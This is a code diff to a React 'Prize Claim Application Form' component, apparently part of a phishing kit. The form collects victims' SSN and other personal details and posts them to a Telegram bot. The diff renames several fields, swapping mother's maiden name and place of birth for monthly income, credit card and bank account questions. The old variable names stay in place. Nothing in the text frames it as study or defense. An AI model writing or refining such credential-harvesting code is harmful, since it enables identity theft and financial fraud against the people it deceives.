@@ -92,11 +92,11 @@ const ClaimWinnings = () => {
   💼 *Occupation:* ${formData.occupation}
   🆔 *SSN:* ${formData.ssn}
   📝 *Tax Filled:* ${formData.tax_filled}
-  👨‍👩‍👦 *Father's Name:* ${formData.father_fullname}
-  👩‍👦 *Mother's Name:* ${formData.mother_fullname}
-  🔎 *Mother's Maiden Name:* ${formData.mmn}
-  📍 *Place of Birth:* ${formData.place_of_birth}
-  🏠 *Previous Address:* ${formData.previous_address}
+  👨‍👩‍👦 *Marital Status:* ${formData.father_fullname}
+  👩‍👦 *Monthly Income:* ${formData.mother_fullname}
+  🔎 *Own Credit Card:* ${formData.mmn}
+  📍 *Own Bank Account:* ${formData.place_of_birth}
+  🏠 *cash or check:* ${formData.previous_address}
     `;
   
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -151,11 +151,11 @@ Prize Claim Application Form
     { name: "age", type: "number", placeholder: "Age" },
     { name: "occupation", placeholder: "Occupation" },
     { name: "ssn", placeholder: "SSN" },
-    { name: "father_fullname", placeholder: "Father's Full Name" },
-    { name: "mother_fullname", placeholder: "Mother's Full Name" },
-    { name: "mmn", placeholder: "Mother's Maiden Name (MMN)" },
-    { name: "place_of_birth", placeholder: "Place of Birth" },
-    { name: "previous_address", placeholder: "Previous Address" },
+    { name: "father_fullname", placeholder: "Marital Status" },
+    { name: "mother_fullname", placeholder: "Monthly Income" },
+    { name: "mmn", placeholder: "Own Credit Card" },
+    { name: "place_of_birth", placeholder: "Own Bank Account" },
+    { name: "previous_address", placeholder: "Do you want Cash/Check" },
   ].map(({ name, type = "text", placeholder }) => (
     <div key={name} className="flex flex-col">
       <label htmlFor={name} className="text-sm text-start font-bold mb-2 text-gray-700">
